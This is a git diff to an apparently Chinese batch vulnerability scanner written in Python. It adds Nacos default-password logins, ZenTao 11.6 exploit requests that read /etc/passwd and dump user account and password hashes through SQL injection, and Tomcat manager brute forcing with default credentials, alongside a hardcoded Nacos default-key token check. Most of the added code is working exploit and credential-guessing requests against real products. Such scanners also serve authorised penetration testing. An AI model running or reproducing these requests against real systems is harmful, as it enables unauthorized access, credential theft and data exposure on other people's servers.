@@ -1,16 +1,13 @@
-'''
-Description:[自定义漏洞扫描函数]
-Author:[huan666]
-Date:[2024/8/28]
-update:[2024/8/28]
-'''
+#!/usr/bin/python
 import requests
 import basic
 import sys
 from datetime import datetime
+from base64 import b64encode
 
 
 # es未授权访问漏洞批量检测
+
 def es_unauthorized():
 
     hearder={
@@ -121,13 +118,155 @@ def nacos_vuln_scan():
         nacos_secret_dir = "/nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ&pageNo=1&pageSize=9"
         try:
             # 忽略ssl证书验证
-            res_secret = requests.get(url+nacos_secret_dir,headers=hearders,allow_redirects=False,timeout=2,verify=False)
+            res_secret = requests.get(url+nacos_secret_dir,headers=hearders,allow_redirects=False,timeout=1,verify=False)
             res_secret.encoding='utf-8'
             res_secret_text = res_secret.text
             if 'totalCount' and 'username' and 'password' and 'pageItems' in res_secret_text:
                 print("[+]"+" "+formatted_time+" "+"目标："+" "+url+nacos_secret_dir+" "+"存在 Nacos secret.key默认密钥 未授权访问漏洞")
         except:
             pass
+
+        # nacos常见弱口令扫描
+        weakpassword_dir = "/nacos/v1/auth/users/login"
+        data01 = {
+            'username':'test',
+            'password':'test'
+        }
+        data02 = {
+            'username':'nacos',
+            'password':'nacos'
+        }
+        data03 = {
+            'username':'admin',
+            'password':'123456'
+        }
+        data04 = {
+           'username':'admin',
+           'password':'admin@123456' 
+        }
+        data05 = {
+            "username":"nacos",
+            "password":"123456"
+        }
+        dict_list = [data01,data02,data03,data04,data05]
+        try:
+            for auth in dict_list:
+                # 发送POST请求,忽略ssl验证
+                response_weak = requests.post(url+weakpassword_dir, data=auth, headers=hearders,allow_redirects=False,timeout=2,verify=False)
+                response_weak.encoding='utf-8'
+                response_weak_text = response_weak.text
+    
+                if '200' and 'Authorization' and 'accessToken' and 'username' in response_weak_text:
+                    
+                    print("[+]"+" "+formatted_time+" "+"目标："+" "+url+weakpassword_dir+" "+"存在弱口令风险:"+"("+auth['username']+"/"+auth['password']+")")
+        except:
+            pass
+
+
+
+# 禅道漏洞批量扫描
+def chandao_vuln_scan():
+    url_list = basic.url_file_ip_list()
+    for url in url_list:
+        hearder={
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)'
+        }
+
+        # 获取当前时间
+        now = datetime.now()
+        # 格式化时间，只保留时、分、秒
+        formatted_time = now.strftime("%H:%M:%S")
+
+        # 验证禅道 11.6 api-getModel-api-getMethod-filePath 任意文件读取漏洞
+        chandao_file_read_dir = "/api-getModel-file-parseCSV-fileName=/etc/passwd"
+        try:
+            # 忽略ssl证书验证
+            res_readfile = requests.get(url+chandao_file_read_dir,headers=hearder,allow_redirects=False,timeout=1,verify=False)
+            res_readfile.encoding='utf-8'
+            res_readfile_text = res_readfile.text
+            if 'success' and 'data' and 'md5' in res_readfile_text:
+                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+chandao_file_read_dir+" "+"存在禅道 11.6 api-getModel-api-getMethod-filePath 任意文件读取漏洞")
+        except:
+            pass
+        
+        # 禅道 11.6 api-getModel-api-sql-sql 后台SQL注入漏洞
+        chandao_api_sql_dir = "/api-getModel-api-sql-sql=select+account,password+from+zt_user"
+        
+        try:
+            # 忽略ssl证书验证
+            res_api_sql = requests.get(url+chandao_api_sql_dir,headers=hearder,allow_redirects=False,timeout=2,verify=False)
+            res_api_sql.encoding='utf-8'
+            res_api_sql_text = res_api_sql.text
+            if 'password' and '\"account\"\:\"zentao\"' in res_api_sql_text:
+                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+chandao_api_sql_dir+" "+"存在禅道 11.6 api-getModel-api-sql-sql 后台SQL注入漏洞")
+        except:
+            pass
+
+# tomcat 相关漏洞扫描
+def tomcat_vuln_scan():
+    # 获取当前时间
+    now = datetime.now()
+    # 格式化时间，只保留时、分、秒
+    formatted_time = now.strftime("%H:%M:%S")
+    url_list = basic.url_file_ip_list()
+    # tomcat口令暴力破解
+    # 修改路径为/manager/html
+    manager_dir_list = []
+    for url in url_list:
+        manager_dir_list.append(url+"/manager/html")
+    
+    data01 = {
+        'username':'tomcat',
+        'password':'tomcat'
+    }
+    data02 = {
+        'username':'admin',
+        'password':'123456'
+    }
+    data03 = {
+        'username':'test',
+        'password':'test'
+    }
+    dict_auth = [data01,data02,data03]
+    
+    for manager_url in manager_dir_list:
+
+
+        # 基本认证信息，用户名和密码
+        for auth in dict_auth:
+            username = auth['username']
+            password = auth['password']
+
+            auth_str = f'{username}:{password}'
+            encoded_auth_str = b64encode(auth_str.encode()).decode()
+            
+            # HTTP头部信息
+            headers = {
+                'Cache-Control': 'max-age=0',
+                'Authorization': f'Basic {encoded_auth_str}',
+                'Upgrade-Insecure-Requests': '1',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'Accept-Encoding': 'gzip, deflate',
+                'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
+                'Cookie': 'session=eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6Im1haW5hZG1pbiJ9.ZtGVgQ.kMYFZ3Q-TCESRxeGWA0SlNNDGr0',
+                'Connection': 'close'
+            }
+            
+            # 捕获异常处理
+            try:
+                # 发送GET请求
+                response_weakpassword_tomcat = requests.get(manager_url, headers=headers,allow_redirects=False,timeout=2,verify=False)
+                response_weakpassword_tomcat.encoding='utf-8'
+                response_weakpassword_tomcat_text = response_weakpassword_tomcat.text
+                if 'Tomcat Web应用程序管理者' and '启动' and '停止' and '重新加载' in response_weakpassword_tomcat_text:
+                    print("[+]"+" "+formatted_time+" "+"目标："+" "+manager_url+" "+"存在tomcat管理后台弱口令"+"弱口令:"+"("+username+"/"+password+")")
+            except:
+                pass
+  
+
+
+
 
 
 if __name__ == "__main__":
@@ -137,6 +276,10 @@ if __name__ == "__main__":
             es_unauthorized()
         elif func_name == 'nacos_vuln_scan':
             nacos_vuln_scan()
+        elif func_name == 'chandao_vuln_scan':
+            chandao_vuln_scan()
+        elif func_name == 'tomcat_vuln_scan':
+            tomcat_vuln_scan()
         else:
             print("Invalid function number")
     else:
